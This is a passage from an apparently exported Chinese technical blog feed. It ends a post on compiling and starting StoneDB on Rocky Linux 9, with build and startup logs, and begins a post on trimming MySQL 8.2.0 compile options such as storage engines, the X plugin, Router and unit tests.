mysys_ssl</span><br><span class="line">[ 14%] Built target comp_err</span><br><span class="line">[ 14%] Built target GenError</span><br><span class="line">[ 15%] Built target clientlib</span><br><span class="line">[ 15%] Built target libmysql</span><br><span class="line">[ 15%] Built target libmysql_api_test</span><br><span class="line">[ 15%] Built target mysqlclient</span><br><span class="line">[ 15%] Built target authentication_ldap_sasl_client</span><br><span class="line">[ 15%] Built target binlogevents_static</span><br><span class="line">[ 15%] Built target binlogstandalone_shared</span><br><span class="line">[ 16%] Built target binlogstandalone_static</span><br><span class="line">[ 16%] Built target archive</span><br><span class="line">[ 16%] Built target blackhole</span><br><span class="line">[ 17%] Built target csv</span><br><span class="line">[ 18%] Built target mysqlservices</span><br><span class="line">[ 18%] Built target example</span><br><span class="line">[ 19%] Built target federated</span><br><span class="line">[ 21%] Built target heap</span><br><span class="line">[ 27%] Built target innobase</span><br><span class="line">[ 29%] Built target myisam</span><br><span class="line">[ 31%] Built target myisam_nopfs</span><br><span class="line">[ 32%] Built target myisam_ftdump</span><br><span class="line">[ 32%] Built target myisampack</span><br><span class="line">[ 32%] Built target myisamlog</span><br><span class="line">[ 33%] Built target myisamchk</span><br><span class="line">[ 34%] Built target myisammrg</span><br><span class="line">[ 34%] Built target partition</span><br><span class="line">[ 40%] Built target perfschema</span><br><span class="line">[ 50%] Built target tianmu</span><br><span class="line">[ 51%] Built target test_prog</span><br><span class="line">[ 51%] Built target test_security_context</span><br><span class="line">[ 51%] Built target audit_null</span><br><span class="line">[ 51%] Built target auth</span><br><span class="line">[ 52%] Built target qa_auth_interface</span><br><span class="line">[ 52%] Built target auth_test_plugin</span><br><span class="line">[ 52%] Built target qa_auth_client</span><br><span class="line">[ 52%] Built target qa_auth_server</span><br><span class="line">[ 52%] Built target mysql_no_login</span><br><span class="line">[ 52%] Built target auth_socket</span><br><span class="line">[ 52%] Built target connection_control</span><br><span class="line">[ 52%] Built target daemon_example</span><br><span class="line">[ 52%] Built target ngram_parser</span><br><span class="line">[ 52%] Built target ftexample</span><br><span class="line">[ 52%] Built target keyring_file</span><br><span class="line">[ 52%] Built target validate_password</span><br><span class="line">[ 52%] Built target replication_observers_example</span><br><span class="line">[ 52%] Built target rewrite_example</span><br><span class="line">[ 52%] Built target rewriter</span><br><span class="line">[ 53%] Built target semisync_slave</span><br><span class="line">[ 53%] Built target semisync_master</span><br><span class="line">[ 53%] Built target test_sql_replication</span><br><span class="line">[ 53%] Built target test_sql_sqlmode</span><br><span class="line">[ 54%] Built target test_sql_lock</span><br><span class="line">[ 54%] Built target test_sql_commit</span><br><span class="line">[ 54%] Built target test_x_sessions_init</span><br><span class="line">[ 54%] Built target test_sql_errors</span><br><span class="line">[ 54%] Built target test_x_sessions_deinit</span><br><span class="line">[ 55%] Built target test_session_detach</span><br><span class="line">[ 55%] Built target test_session_info</span><br><span class="line">[ 55%] Built target test_sql_complex</span><br><span class="line">[ 55%] Built target test_sql_all_col_types</span><br><span class="line">[ 55%] Built target test_sql_2_sessions</span><br><span class="line">[ 55%] Built target test_sql_cmds_1</span><br><span class="line">[ 55%] Built target test_sql_shutdown</span><br><span class="line">[ 55%] Built target test_session_in_thd</span><br><span class="line">[ 55%] Built target test_sql_processlist</span><br><span class="line">[ 55%] Built target test_sql_stored_procedures_functions</span><br><span class="line">[ 55%] Built target test_sql_views_triggers</span><br><span class="line">[ 55%] Built target test_services_thread</span><br><span class="line">[ 55%] Built target test_services</span><br><span class="line">[ 55%] Built target test_framework</span><br><span class="line">[ 55%] Built target test_udf_services</span><br><span class="line">[ 55%] Built target version_token</span><br><span class="line">[ 60%] Built target group_replication</span><br><span class="line">[ 60%] Built target keyring_udf</span><br><span class="line">[ 62%] Built target protobuf</span><br><span class="line">[ 64%] Built target protoclib</span><br><span class="line">[ 64%] Built target protoc</span><br><span class="line">[ 66%] Built target mysqlxtest</span><br><span class="line">[ 66%] Built target protobuf-lite</span><br><span class="line">[ 66%] Built target GenLiteProtos</span><br><span class="line">[ 71%] Built target mysqlx</span><br><span class="line">[ 72%] Built target my_print_defaults</span><br><span class="line">[ 73%] Built target perror</span><br><span class="line">[ 73%] Built target lz4_decompress</span><br><span class="line">[ 74%] Built target resolveip</span><br><span class="line">[ 74%] Built target replace</span><br><span class="line">[ 75%] Built target innochecksum</span><br><span class="line">[ 76%] Built target zlib_decompress</span><br><span class="line">[ 76%] Built target resolve_stack_dump</span><br><span class="line">[ 76%] Built target mysql_ssl_rsa_setup</span><br><span class="line">[ 76%] Built target comp_sql</span><br><span class="line">[ 76%] Built target GenSysSchema</span><br><span class="line">[ 76%] Built target GenBootstrapPriv</span><br><span class="line">[ 76%] Built target mysql_install_db</span><br><span class="line">[ 76%] Built target mysql_secure_installation</span><br><span class="line">[ 76%] Built target mysql</span><br><span class="line">[ 76%] Built target mysqltest</span><br><span class="line">[ 76%] Built target GenFixPrivs</span><br><span class="line">[ 76%] Built target mysqlcheck_core</span><br><span class="line">[ 77%] Built target client_base</span><br><span class="line">[ 78%] Built target mysql_upgrade</span><br><span class="line">[ 78%] Built target mysqlcheck</span><br><span class="line">[ 78%] Built target mysqldump</span><br><span class="line">[ 78%] Built target mysqlimport</span><br><span class="line">[ 78%] Built target mysqlshow</span><br><span class="line">[ 78%] Built target mysql_plugin</span><br><span class="line">[ 78%] Built target mysqlbinlog</span><br><span class="line">[ 78%] Built target mysqladmin</span><br><span class="line">[ 79%] Built target mysql_config_editor</span><br><span class="line">[ 79%] Built target mysqlslap</span><br><span class="line">[ 79%] Built target boost_lib</span><br><span class="line">[ 83%] Built target mysqlpump_lib</span><br><span class="line">[ 84%] Built target mysqlpump</span><br><span class="line">[ 84%] Built target mysql_client_test</span><br><span class="line">[ 84%] Built target locking_service</span><br><span class="line">[ 84%] Built target udf_example</span><br><span class="line">[ 86%] Built target binlog</span><br><span class="line">[ 86%] Built target gen_lex_hash</span><br><span class="line">[ 87%] Built target GenServerSource</span><br><span class="line">[ 87%] Built target gen_lex_token</span><br><span class="line">[ 87%] Built target GenDigestServerSource</span><br><span class="line">[ 99%] Built target sql</span><br><span class="line">[ 99%] Built target rpl</span><br><span class="line">[ 99%] Built target master</span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target slave</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target mysqld</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target sqlgunitlib</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target mysql_tzinfo_to_sql</span></span><br><span class="line">[shawnyan@rocky9 release]$</span><br></pre></td></tr></table></figure></div>
<h3 id="安装日志">安装日志</h3>
<p>编译完成，直接进行安装。日志中，可以看到安装了几个二进制命令，以及一些配置文件和脚本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 release]$ sudo make install</span><br><span class="line">[  0%] Built target abi_check</span><br><span class="line">[  0%] Built target lz4_lib</span><br><span class="line">[  0%] Built target INFO_SRC</span><br><span class="line">[  0%] Built target INFO_BIN</span><br><span class="line">[  0%] Built target zlib</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target mysqld</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target sqlgunitlib</span></span><br><span class="line"><span class="meta prompt_">[100%</span><span class="language-bash">] Built target mysql_tzinfo_to_sql</span></span><br><span class="line">Install the project...</span><br><span class="line">-- Install configuration: &quot;RelWithDebInfo&quot;</span><br><span class="line">-- Installing: /usr/local/mysql/./README</span><br><span class="line">...</span><br><span class="line">-- Installing: /usr/local/mysql/bin/mysql_config</span><br><span class="line">-- Installing: /usr/local/mysql/bin/mysqldumpslow</span><br><span class="line">-- Installing: /usr/local/mysql/bin/mysqld_multi</span><br><span class="line">-- Installing: /usr/local/mysql/bin/mysqld_safe</span><br><span class="line">-- Installing: /usr/local/mysql/my.cnf</span><br><span class="line">-- Installing: /usr/local/mysql/mysql_server</span><br><span class="line">-- Installing: /usr/local/mysql/install.sh</span><br><span class="line">-- Installing: /usr/local/mysql/reinstall.sh</span><br><span class="line">-- Installing: /usr/local/mysql/support-files/mysqld_multi.server</span><br><span class="line">-- Installing: /usr/local/mysql/support-files/mysql-log-rotate</span><br><span class="line">-- Installing: /usr/local/mysql/support-files/magic</span><br><span class="line">-- Installing: /usr/local/mysql/share/aclocal/mysql.m4</span><br><span class="line">-- Installing: /usr/local/mysql/support-files/mysql.server</span><br></pre></td></tr></table></figure></div>
<h3 id="启动日志">启动日志</h3>
<p>安装完成，对 StoneDB 进行数据初始化，并启动数据库。</p>
<!--

[root@rocky9 bin]# ./mysqld_safe
/usr/local/mysql/bin/my_print_defaults: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory
/usr/local/mysql/bin/my_print_defaults: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory
Logging to '/usr/local/mysql/data/rocky9.shawnyan.cn.err'.
2023-11-12T00:22:54.429852Z mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data
2023-11-12T00:22:54.442742Z mysqld_safe mysqld from pid file /usr/local/mysql/data/rocky9.shawnyan.cn.pid ended
[root@rocky9 bin]#
[root@rocky9 bin]#
[root@rocky9 bin]# locate libssl.so.1.1
/data/stonedb-stonedb-5.7-dev/release/openssl-OpenSSL_1_1_1t/libssl.so.1.1
/usr/local/lib64/libssl.so.1.1
[root@rocky9 bin]#
[root@rocky9 bin]# ./mysqld
./mysqld: error while loading shared libraries: libboost_system.so.1.77.0: cannot open shared object file: No such file or directory
[root@rocky9 bin]# locate libboost_system.so.1.77.0
/data/stonedb-stonedb-5.7-dev/release/boost_1_77_0/bin.v2/libs/system/build/gcc-11/release/threading-multi/visibility-hidden/libboost_system.so.1.77.0
/data/stonedb-stonedb-5.7-dev/release/boost_1_77_0/stage/lib/libboost_system.so.1.77.0
[root@rocky9 bin]#
[root@rocky9 bin]# ./mysqld
./mysqld: error while loading shared libraries: libmarisa.so.0: cannot open shared object file: No such file or directory
[root@rocky9 bin]# locate libmarisa.so.0
/data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6/lib/marisa/.libs/libmarisa.so.0
/data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6/lib/marisa/.libs/libmarisa.so.0.0.0
/usr/local/lib/libmarisa.so.0
/usr/local/lib/libmarisa.so.0.0.0

~~~

export LD_LIBRARY_PATH=/usr/local/lib64:/usr/local/lib:/data/stonedb-stonedb-5.7-dev/release/boost_1_77_0/stage/lib

-->
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 mysql]$ ./bin/mysqld --initialize</span><br><span class="line">2023-11-12T00:29:25.724443Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).</span><br><span class="line">2023-11-12T00:29:25.936358Z 0 [Warning] InnoDB: New log files created, LSN=45790</span><br><span class="line">2023-11-12T00:29:25.968770Z 0 [Warning] InnoDB: Creating foreign key constraint system tables.</span><br><span class="line">2023-11-12T00:29:26.055356Z 0 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: 88cba90a-80f2-11ee-bdca-000c2919b58f.</span><br><span class="line">2023-11-12T00:29:26.056284Z 0 [Warning] Gtid table is not ready to be used. Table &#x27;mysql.gtid_executed&#x27; cannot be opened.</span><br><span class="line">2023-11-12T00:29:26.277207Z 0 [Warning] A deprecated TLS version TLSv1 is enabled. Please use TLSv1.2 or higher.</span><br><span class="line">2023-11-12T00:29:26.277310Z 0 [Warning] A deprecated TLS version TLSv1.1 is enabled. Please use TLSv1.2 or higher.</span><br><span class="line">2023-11-12T00:29:26.277919Z 0 [Warning] CA certificate ca.pem is self signed.</span><br><span class="line">2023-11-12T00:29:26.291107Z 1 [Note] A temporary password is generated for root@localhost: r6K_oTsETP&lt;q</span><br><span class="line">[mysql@rocky9 mysql]$</span><br><span class="line"></span><br><span class="line">[mysql@rocky9 mysql]$ ./bin/mysqld</span><br><span class="line">2023-11-12T00:29:54.068726Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).</span><br><span class="line">2023-11-12T00:29:54.068785Z 0 [Note] --secure-file-priv is set to NULL. Operations related to importing and exporting data are disabled</span><br><span class="line">2023-11-12T00:29:54.068806Z 0 [Note] ./bin/mysqld (mysqld 5.7.36-StoneDB-) starting as process 290517 ...</span><br><span class="line">2023-11-12T00:29:54.076153Z 0 [Note] InnoDB: PUNCH HOLE support available</span><br><span class="line">2023-11-12T00:29:54.076348Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class="line">2023-11-12T00:29:54.076503Z 0 [Note] InnoDB: Uses event mutexes</span><br><span class="line">2023-11-12T00:29:54.076697Z 0 [Note] InnoDB: GCC builtin __atomic_thread_fence() is used for memory barrier</span><br><span class="line">2023-11-12T00:29:54.076756Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.11</span><br><span class="line">2023-11-12T00:29:54.076805Z 0 [Note] InnoDB: Using Linux native AIO</span><br><span class="line">2023-11-12T00:29:54.077154Z 0 [Note] InnoDB: Number of pools: 1</span><br><span class="line">2023-11-12T00:29:54.077581Z 0 [Note] InnoDB: Using CPU crc32 instructions</span><br><span class="line">2023-11-12T00:29:54.080562Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M</span><br><span class="line">2023-11-12T00:29:54.092507Z 0 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-11-12T00:29:54.095925Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().</span><br><span class="line">2023-11-12T00:29:54.110502Z 0 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-11-12T00:29:54.118113Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables</span><br><span class="line">2023-11-12T00:29:54.118465Z 0 [Note] InnoDB: Setting file &#x27;./ibtmp1&#x27; size to 12 MB. Physically writing the file full; Please wait ...</span><br><span class="line">2023-11-12T00:29:54.140182Z 0 [Note] InnoDB: File &#x27;./ibtmp1&#x27; size is now 12 MB.</span><br><span class="line">2023-11-12T00:29:54.141586Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.</span><br><span class="line">2023-11-12T00:29:54.141913Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.</span><br><span class="line">2023-11-12T00:29:54.142898Z 0 [Note] InnoDB: 5.7.36 started; log sequence number 2750173</span><br><span class="line">2023-11-12T00:29:54.143317Z 0 [Note] InnoDB: Loading buffer pool(s) from /usr/local/mysql/data/ib_buffer_pool</span><br><span class="line">2023-11-12T00:29:54.143846Z 0 [Note] Plugin &#x27;FEDERATED&#x27; is disabled.</span><br><span class="line">2023-11-12T00:29:54.144584Z 0 [Note] InnoDB: Buffer pool(s) load completed at 231112  8:29:54</span><br><span class="line">2023-11-12T00:29:54.187904Z 0 [Note] Found ca.pem, server-cert.pem and server-key.pem in data directory. Trying to enable SSL support using them.</span><br><span class="line">2023-11-12T00:29:54.188261Z 0 [Note] Skipping generation of SSL certificates as certificate files are present in data directory.</span><br><span class="line">2023-11-12T00:29:54.188456Z 0 [Warning] A deprecated TLS version TLSv1 is enabled. Please use TLSv1.2 or higher.</span><br><span class="line">2023-11-12T00:29:54.188639Z 0 [Warning] A deprecated TLS version TLSv1.1 is enabled. Please use TLSv1.2 or higher.</span><br><span class="line">2023-11-12T00:29:54.189276Z 0 [Warning] CA certificate ca.pem is self signed.</span><br><span class="line">2023-11-12T00:29:54.189519Z 0 [Note] Skipping generation of RSA key pair as key files are present in data directory.</span><br><span class="line">2023-11-12T00:29:54.190187Z 0 [Note] Server hostname (bind-address): &#x27;*&#x27;; port: 3306</span><br><span class="line">2023-11-12T00:29:54.190764Z 0 [Note] IPv6 is available.</span><br><span class="line">2023-11-12T00:29:54.190992Z 0 [Note]   - &#x27;::&#x27; resolves to &#x27;::&#x27;;</span><br><span class="line">2023-11-12T00:29:54.191189Z 0 [Note] Server socket created on IP: &#x27;::&#x27;.</span><br><span class="line">2023-11-12T00:29:54.202723Z 0 [Note] Event Scheduler: Loaded 1 event</span><br><span class="line">2023-11-12T00:29:54.203592Z 0 [Note] ./bin/mysqld: ready for connections.</span><br><span class="line">Version: &#x27;5.7.36-StoneDB-&#x27;  socket: &#x27;/tmp/mysql.sock&#x27;  port: 3306  build-</span><br></pre></td></tr></table></figure></div>
<!--
merge_operator.h 编译报错，注释掉。编译完成后，可以正常启动，但是重启报错。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-11-12T00:35:42.600204Z 0 [Note] InnoDB: Buffer pool(s) load completed at 231112  8:35:42</span><br><span class="line">mysqld: Error opening rocks instance. status msg: Invalid argument: merge_operator is not properly initialized.</span><br><span class="line">2023-11-12T00:35:42.629684Z 0 [ERROR] Plugin &#x27;TIANMU&#x27; init function returned error.</span><br><span class="line">2023-11-12T00:35:42.629705Z 0 [ERROR] Plugin &#x27;TIANMU&#x27; registration as a STORAGE ENGINE failed.</span><br><span class="line">2023-11-12T00:35:42.629825Z 0 [ERROR] Failed to initialize dynamic plugins.</span><br><span class="line">2023-11-12T00:35:42.629845Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure></div>
<p>–&gt;</p>
<h2 id="End">End.</h2>
<p>经过三天三夜的持久战，终于将 StoneDB 在 Rocky 9 上运行起来了。</p>
<p>ShawnYan<br>
2023/11/12 深夜🌛<br>
End.</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1723383648416784384" >https://www.modb.pro/db/1723383648416784384 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>StoneDB</category>
      </categories>
      <tags>
        <tag>compile</tag>
        <tag>rocky</tag>
        <tag>stonedb</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL 8.x】定制化 MySQL 8.2.0 编译选项（文末彩蛋）</title>
    <url>/2023/mysql/mysql-8.2.0-compile-customization/</url>
    <content><![CDATA[<img  alt="mysql-logo.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231030-e3039511-88f3-4035-82fc-89d0f77a4e52.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="前情提要">前情提要</h2>
<p>前文介绍了如何在 Rocky Linux 9.2 上编译 MySQL 8.2.0 DEBUG 版本。但也留有疑问，编译时间过长，可否缩短等待时间。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-sys-vars/">【MySQL 8.2.0】从参数变化解读 MySQL 8.2.0 发版说明</a></li>
<li><a href="https://shawnyan.cn/2023/mysql/mysql-8.2.0-compile-on-rocky-9/">【MySQL 8.2.0】在 Rocky 9 上编译 MySQL 8.2.0 Debug 版本编译指南</a></li>
</ul>
<!-- 
- [【MySQL 8.2.0】从参数变化解读 MySQL 8.2.0 发版说明](https://www.modb.pro/db/1717737071887081472)
- [【MySQL 8.2.0】在 Rocky 9 上编译 MySQL 8.2.0 Debug 版本编译指南](https://www.modb.pro/db/1719026980815986688)
-->
<p>本文将着重介绍 MySQL 8.2.0 编译过程中一些可定制的编译选项。</p>
<h2 id="MySQL-存储引擎">MySQL 存储引擎</h2>
<p>在 MySQL 编译过程中，除了我们熟知的 MyISAM、InnoDB 引擎，还会默认编译几种存储引擎，分别是：</p>
<ul>
<li>ARCHIVE</li>
<li>BLACKHOLE</li>
<li>FEDERATED</li>
<li>NDBCLUSTER</li>
<li>CSV</li>
<li>HEAP</li>
</ul>
<p>下面来逐一介绍。</p>
<h3 id="ARCHIVE">ARCHIVE</h3>
<p>ARCHIVE 存储引擎<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，意为归档，可用于生成特殊用途的表，这些表以很小的占用空间存储大量未索引的数据。</p>
<p>ARCHIVE 的表只支持写入 (INSERT/REPLACE) 和查询 (SELECT)，不支持修改 (UPDATE) 和删除 (DELETE)。</p>
<p>该引擎不常用，且在 MySQL 8.2 中没有新的变化，预编译时加入参数 (<code>WITH_ARCHIVE_STORAGE_ENGINE=OFF</code>) 可跳过该引擎。</p>
<h3 id="BLACKHOLE">BLACKHOLE</h3>
<p>BLACKHOLE 故名思议为“黑洞”，可以接收数据，但并不储存数据。特殊的是，该引擎的表会写二进制日志 (binlog)，所以可以用在中继 (relay) 复制节点。</p>
<p>该引擎不常用，且在 MySQL 8.2 中没有新的变化，预编译时加入参数 (<code>WITH_BLACKHOLE_STORAGE_ENGINE=OFF</code>) 可跳过该引擎。</p>
<h3 id="FEDERATED">FEDERATED</h3>
<p>简言之，FEDERATED 是 MySQL 里的 “DB Link”，支持从本地访问远程 MySQL 数据库里的表，而本地并不存储数据。</p>
<p>该引擎不常用，且在 MySQL 8.2 中没有新的变化，预编译时加入参数 (<code>WITH_FEDERATED_STORAGE_ENGINE=OFF</code>) 可跳过该引擎。</p>
<h3 id="NDBCLUSTER">NDBCLUSTER</h3>
<p>NDB 是 Network Database 的缩写，NDB 集群是 shared-nothing 架构，由 SQL 节点，数据节点和 NDB 管理节点组成。</p>
<p>以下引用摘自官方文档：</p>
<blockquote>
<p>NDB Cluster is a technology that enables clustering of in-memory databases in a shared-nothing system. The shared-nothing architecture enables the system to work with very inexpensive hardware, and with a minimum of specific requirements for hardware or software. <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
</blockquote>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://dev.mysql.com/doc/refman/8.2/en/images/cluster-components-1.png"
                      alt="" loading="lazy"
                ></p>
<p>从 MySQL 集群架构来说，推荐使用 InnoDB Cluster，而非 NDB Cluster，所以，在预编译时加入参数 (<code>WITH_NDBCLUSTER_STORAGE_ENGINE=OFF</code>) 跳过该引擎。</p>
<h3 id="CSV">CSV</h3>
<p>CSV 存储引擎，用于将表数据存储在文本文件中。从 MySQL 5.7.1 开始，改为强制编译。</p>
<!--
https://dev.mysql.com/doc/refman/8.2/en/csv-storage-engine.html
The CSV storage engine is always compiled into the MySQL server.

https://github.com/mysql/mysql-server/commit/c6fd022490d52e79f2d34b00edb0cf2bbb581e4e
Bug#15997345: REMOVE WITH_CSV_STORAGE_ENGINE AND WITH_MYISAMMRG_STORAGE_ENGINE IFDEFS
-->
<h3 id="HEAP-MEMORY">HEAP (MEMORY)</h3>
<p>HEAP 存储引擎<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，又称 MEMORY 存储引擎。顾名思义，输出存储在内存中，不具备数据持久化功能，所以仅可用于临时表。且不建议用在复制中，可能会造成上下游数据不一致的情况。</p>
<p>但由于该引擎默认编译，故一般情况下，加参数 <code>WITH_HEAP_STORAGE_ENGINE</code> 也无法跳过。</p>
<h3 id="其他引擎">其他引擎</h3>
<p>除过以上几种存储引擎之外，还有几种常见的引擎，如 InnoDB, MyISAM, PERFSCHEMA 等，但这都是 MySQL 默认绑定预装的，无法剥离。</p>
<h2 id="MYSQL-X-插件">MYSQL X 插件</h2>
<p>从 MySQL 5.7.12 开始，引入 X plugin，包括 X 协议 和 X 开发API。该插件起到一个接口的作用，提供如 MySQL Shell (mysqlsh) 之类的工具连接 MySQL 服务器。</p>
<p>在 MySQL 5.7 中，需要用如下命令来安装，插件文件默认在 <code>plugin_dir</code> 路径下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">INSTALL PLUGIN mysqlx SONAME <span class="string">&#x27;mysqlx.so&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>在 MySQL 8.0 中，该插件默认安装。</p>
<p>如果需要卸载该插件，需要使用如下命令：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">UNINSTALL PLUGIN mysqlx;</span><br></pre></td></tr></table></figure></div>
<p>编译时，可以通过参数 <code>WITH_MYSQLX</code> 进行控制是否进行编译。</p>
<h2 id="MySQL-Router-组件">MySQL Router 组件</h2>
<p>MySQL Router 是一个代理组件，负责分发来自应用的流量到后端数据库，支持读写、只读流量分发。</p>
<p>MySQL Route 是个轻量级组件，是 InnoDB Cluster 的重要组成。<sup class="footnote-ref"><a href="#fn3" id="fnref3:1">[3:1]</a></sup></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb_cluster_overview.png"
                      alt="" loading="lazy"
                ></p>
<p>但是，如果不使用 MIC 方案，则可选择 ProxySQL 或 HAProxy 作为代理。</p>
<p>编译时，可以通过参数 <code>WITH_ROUTER</code> 进行控制是否进行编译。</p>
<h2 id="编译过程">编译过程</h2>
<p>经过上述阐述，我们大致了解了 MySQL 常见的存储引擎，针对不同项目的使用情况，我们可以有针对性的使用不同的存储引擎，有些存储引擎如果用不到，就可以不安装，甚至不编译进安装包。</p>
<p>我们知道在 MySQL 的源码里，有很大一部分的代码是测试用例，在完整版的安装包里也会包含测试脚本，但在安装包正式发布前，一定是通过测试的，并且在生产环境中，并不会去运行测试脚本，所以我们可以跳过编译测试用例，以节省时间。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 debug]# grep -i MYSQLTEST CMakeCache.txt </span><br><span class="line">//MYSQLTEST installation directory</span><br><span class="line">INSTALL_MYSQLTESTDIR:STRING=mysql-test</span><br><span class="line">//ADVANCED property for variable: INSTALL_MYSQLTESTDIR</span><br><span class="line">INSTALL_MYSQLTESTDIR-ADVANCED:INTERNAL=1</span><br></pre></td></tr></table></figure></div>
<p>下面来演示优化后的编译过程。</p>
<p>预编译选项如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cmake .. \</span><br><span class="line">-DCMAKE_BUILD_TYPE=Debug \</span><br><span class="line">-DWITH_BOOST=. \</span><br><span class="line">-DWITH_ARCHIVE_STORAGE_ENGINE=OFF \</span><br><span class="line">-DWITH_BLACKHOLE_STORAGE_ENGINE=OFF \</span><br><span class="line">-DWITH_FEDERATED_STORAGE_ENGINE=OFF \</span><br><span class="line">-DWITH_NDBCLUSTER_STORAGE_ENGINE=OFF \</span><br><span class="line">-DWITH_UNIT_TESTS=OFF</span><br></pre></td></tr></table></figure></div>
<!--
cmake .. -LH \
-DCMAKE_BUILD_TYPE=Debug \
-DWITH_BOOST=. \
-DWITH_ARCHIVE_STORAGE_ENGINE=OFF \
-DWITH_BLACKHOLE_STORAGE_ENGINE=OFF \
-DWITH_FEDERATED_STORAGE_ENGINE=OFF \
-DWITH_NDBCLUSTER_STORAGE_ENGINE=OFF \
-DWITH_UNIT_TESTS=OFF \
-DINSTALL_MYSQLTESTDIR= \
-DWITH_MYSQLX=OFF \
-DWITH_ROUTER=OFF \
-DEXTRA_VERSION="-ShawnYan"
-->
<p>执行编译配置后，可以在生成的缓存文件中进行确认。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 debug]$ grep -i engine CMakeCache.txt</span><br><span class="line">WITH_ARCHIVE_STORAGE_ENGINE:BOOL=OFF</span><br><span class="line">WITH_BLACKHOLE_STORAGE_ENGINE:BOOL=OFF</span><br><span class="line">WITH_FEDERATED_STORAGE_ENGINE:BOOL=OFF</span><br><span class="line">WITH_NDBCLUSTER_STORAGE_ENGINE:UNINITIALIZED=OFF</span><br><span class="line">WITH_CSV_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">WITH_HEAP_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">WITH_INNOBASE_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">WITH_MYISAMMRG_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">WITH_MYISAM_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">WITH_PERFSCHEMA_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">WITH_TEMPTABLE_STORAGE_ENGINE:INTERNAL=ON</span><br><span class="line">[shawnyan@rocky9 debug]$</span><br></pre></td></tr></table></figure></div>
<p>下面是咖啡时间 ☕，等待编译完成。。。</p>
<p>编译完成：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 debug]# grep Built make.log </span><br><span class="line">[  1%] Built target INFO_SRC</span><br><span class="line">[  1%] Built target stack_direction</span><br><span class="line">[  1%] Built target abi_check</span><br><span class="line">[  1%] Built target lz4_lib</span><br><span class="line">[  2%] Built target zlib_objlib</span><br><span class="line">[  2%] Built target icustubdata</span><br><span class="line">[  3%] Built target zstd_objlib</span><br><span class="line">[  5%] Built target uca9dump</span><br><span class="line">[  8%] Built target vio_objlib</span><br><span class="line">[  8%] Built target libprotobuf-lite</span><br><span class="line">[ 11%] Built target mytime_objlib</span><br><span class="line">[ 11%] Built target mysql_gtid</span><br><span class="line">[ 14%] Built target all_sys_schema</span><br><span class="line">[ 14%] Built target comp_sql</span><br><span class="line">[ 14%] Built target gen_lex_hash</span><br><span class="line">[ 14%] Built target GenBootstrapPriv</span><br><span class="line">[ 14%] Built target GenFixPrivs</span><br><span class="line">[ 14%] Built target libedit_emacs</span><br><span class="line">[ 14%] Built target libedit_vi</span><br><span class="line">[ 14%] Built target libedit_common</span><br><span 